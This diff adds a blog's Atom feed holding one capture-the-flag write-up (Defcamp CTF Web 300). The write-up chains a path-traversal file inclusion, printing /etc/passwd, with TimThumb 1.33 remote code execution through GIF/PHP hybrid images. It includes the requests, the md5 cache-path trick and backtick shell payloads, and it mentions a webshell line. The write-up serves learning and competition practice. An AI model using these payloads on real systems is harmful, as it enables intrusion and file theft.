@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Defcamp | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/defcamp/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2014-11-01T15:20:37+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Defcamp CTF: Web 300]]></title>
+    <link href="http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-web-300/"/>
+    <updated>2014-11-01T15:11:55+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-web-300</id>
+    <content type="html"><![CDATA[<p>We are again given an ip address. Upon visiting, it turns out to be some rudimentary page. I immediately spotted a LFI vulnerability, surfing to <code>http://10.13.37.13/?page=../../../../../../etc/passwd</code>.</p>
+
+<!--more-->
+
+
+<pre><code>root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+libuuid:x:100:101::/var/lib/libuuid: 
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin 
+syslog:x:102:105::/home/syslog:/bin/false 
+ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
+</code></pre>
+
+<p>Cool, but I couldn&rsquo;t get further with this. The images are apparently served by TimThumb, as I got this trying to do a LFI in <code>http://10.13.37.13/tt.php?w=240&amp;src=../../../../../etc/passwd</code>:</p>
+
+<pre><code>file not found
+Query String : w=240&amp;src=../../../../../etc/passwd
+TimThumb version : 1.33
+</code></pre>
+
+<p><a href="http://markmaunder.com/2011/08/02/technical-details-and-scripts-of-the-wordpress-timthumb-php-hack/">TimThumb v1.33</a> is vulnerable to RCE. The trick is to upload a malicious JPEG or GIF. This image contains php code, which is also uploaded into the thumbnail. This thumbnail is then stored into the <code>cache</code> directory. Indeed, externally uploaded images files are uploaded there, but only from domains that are in the whitelist. Luckily, <code>photobucket</code> is one of them. I made a black GIF image with a little bit of php appended:</p>
+
+<pre><code class="php">&lt;?php
+echo "Hi";
+?&gt;
+</code></pre>
+
+<p>After uploading it to photobucket, I browsed to <code>http://10.13.37.13/tt.php?w=2400&amp;src=http://i36.photobucket.com/albums/e31/sbsebastian1/pwn_zpsa043d8a3.gif</code>. If you then take the md5 of the request, you can figure out where this image file is saved:</p>
+
+<pre><code class="bash">$ echo -ne 'http://i36.photobucket.com/albums/e31/sbsebastian1/pwn_zpsa043d8a3.gif' |md5sum
+995e80b11b06e24b7d96ce109f4ef217  -
+</code></pre>
+
+<p>This particular file was stored at <code>./cache/external_995e80b11b06e24b7d96ce109f4ef217</code> so I hit the first LFI with that image: <code>http://10.13.37.13/?page=./cache/external_995e80b11b06e24b7d96ce109f4ef217</code>. Besides a lot of garbage, I also got &lsquo;Hi&rsquo;. No php tags, just &lsquo;Hi&rsquo;. This meant that it was indeed executing php code! I attempted to upload a reverse php shell and a simple <code>system($_GET['cmd']);</code> webshell, but both failed. I suspect <code>system()</code> is being blocked or filtered. Frustrated, I uploaded a GIF with the following php code:</p>
+
+<pre><code class="php">...gifdata...
+&lt;?php
+echo "HI FROM VULNHUB-CTF";
+echo `ls -alh`;
+?&gt;
+</code></pre>
+
+<p>This gave me a directory listing:</p>
+
+<pre><code>HI FROM VULNHUB-CTFtotal 116K
+
+drwxr-xr-x 6 root root 4.0K Oct 12 12:36 .
+drwxr-xr-x 3 root root 4.0K Oct 12 12:35 ..
+-rw-r--r-- 1 root root 12 Oct 12 12:09 575b3f3f5318b2afbfe91ed860a4b10c.txt
+drwxrwxrwx 2 root root 52K Oct 18 15:14 cache
+-rw-r--r-- 1 root root 2.7K Oct 12 12:08 contact.html
+drwxr-xr-x 2 root root 4.0K Aug 29 12:19 css
+-rw-r--r-- 1 root root 2.9K Oct 12 12:04 home.html
+drwxr-xr-x 2 root root 4.0K Aug 29 12:19 images
+-rw-r--r-- 1 root root 180 Oct 12 12:03 index.php
+drwxr-xr-x 2 root root 4.0K Aug 29 12:19 js
+-rw-r--r-- 1 root root 21K Jul 31 2011 tt.php
+</code></pre>
+
+<p>This file called <code>575b3f3f5318b2afbfe91ed860a4b10c.txt</code> looked suspicious, so I uploaded a new GIF/php hybrid.</p>
+
+<pre><code class="php">...gifdata...
+&lt;?php
+echo "HI FROM VULNHUB-CTF";
+echo `cat 575b3f3f5318b2afbfe91ed860a4b10c.txt`;
+?&gt;
+</code></pre>
+
+<p>After hitting the LFI again, I was presented with the flag: <code>johnnybravo</code>!</p>
+]]></content>
+  </entry>
+  
+</feed>
